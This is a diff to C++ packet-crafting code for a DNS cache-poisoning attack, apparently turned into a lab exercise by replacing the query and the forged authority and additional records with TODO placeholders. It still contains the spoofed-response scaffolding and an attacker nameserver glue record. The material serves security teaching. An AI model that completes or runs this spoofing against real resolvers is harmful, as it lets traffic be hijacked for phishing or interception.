@@ -30,16 +30,7 @@ int main() {
      * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
      **********************************************/
 
-    // Create DNS query packet
-    DNS dns;
-    dns.id(rand() % 65536);    // Random query ID
-    dns.type(DNS::QUERY);    // This is a query packet
-    dns.recursion_desired(1);    // Set RD flag to true
-    dns.add_query(DNS::Query(
-        request_hostname,    // Domain to query
-        DNS::A,    // IPv4 address record
-        DNS::IN    // Internet class (standard)
-    ));
+    TODO // Create DNS query packet
 
     UDP udp(53, 53);    // Create UDP layer (destination/source port 53)
     udp /= dns;    // Attach DNS payload
@@ -61,21 +52,9 @@ int main() {
         dns.type(DNS::RESPONSE);    // This is a response packet
         dns.add_query(DNS::Query("_.google.com", DNS::A, DNS::IN));
 
-        dns.add_authority(DNS::Resource(
-            target_domain,    // Domain requested
-            TODO,   // domain server of the attacker
-            DNS::TODO,   // Record type
-            DNS::IN,    // Internet class (standard)
-            6000    // TTL in seconds
-        ));
+        TODO // Add the authority section
 
-        dns.add_additional(DNS::Resource(
-            attacker_ns,    // Domain server of the attacker
-            TODO,    // IP address of the nameserver
-            DNS::A,    // Type A
-            DNS::IN,    // Internet class (standard)
-            6000   // TTL in seconds
-        ));
+        TODO // Add the answer section
 
         dns.add_additional(DNS::Resource(attacker_ns, "2001:db8::1", DNS::AAAA, DNS::IN, 6000));    // Add additional record for IPv6 address
 
